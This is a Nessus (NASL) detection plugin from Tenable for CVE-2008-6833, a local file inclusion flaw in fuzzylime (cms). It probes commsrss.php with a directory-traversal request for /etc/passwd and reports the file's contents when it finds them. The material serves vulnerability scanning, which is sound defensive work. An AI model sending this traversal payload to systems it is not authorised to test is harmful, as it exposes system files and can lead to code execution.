#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33546);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2008-6833");
  script_bugtraq_id(30213);
  script_osvdb_id(49873);
  script_xref(name:"EDB-ID", value:"6060");
  script_xref(name:"Secunia", value:"30930");

  script_name(english:"fuzzylime (cms) comssrss.php files[] Parameter Traversal Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running fuzzylime (cms), a PHP-based content
management system. 

The version of fuzzylime (cms) installed on the remote host fails to
sanitize user-supplied input to the 'files' parameter of the
'commsrss.php' script before using it to include PHP code.  Regardless
of PHP's 'register_globals' setting, an unauthenticated attacker may
be able to leverage this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

Other code execution vulnerabilities may exist in this software, but
Nessus does not check for them." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/18");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:fuzzylime:fuzzylime_%28cms%29:3.0");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


file = "/etc/passwd";
file_pat = "root:.*:0:[01]:";

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/fuzzylime", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir,"/commsrss.php?files[0]=", "../../../../../../../../../../../..", file);
  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # "fuzzylime" should appear in the res twice. In the description
  # and generator html tags
  if ("fuzzylime" >< res)
  {
    # There's a problem if ...
    if ( 
      # there's an entry for root or...
      egrep(pattern:file_pat, string:res) ||
      # we get an error claiming the file doesn't exist or...
      string("include(blogs/comments/", "../../../../../../../../../../../..", file, ")") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (
        report_verbosity && 
        "<?xml version" >< res && 
        egrep(pattern:file_pat, string:res)
      )
      {
        output = res - strstr(res,"<?xml version");

        lines = split(output);
        output = "";
        for ( i = 0; i < max_index(lines) ; i ++ )
        {
          line = lines[i];
          if (line !~ '(Warning|Notice)(</b>)?:' && line !~ '^(<br[ >].*)?$') output = output + line;
        }

        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '", file, "'\n",
          "using the URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "The contents are :\n",
            "\n",
            output
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
  } # End if "fuzzylime" >< res
} # End foreach
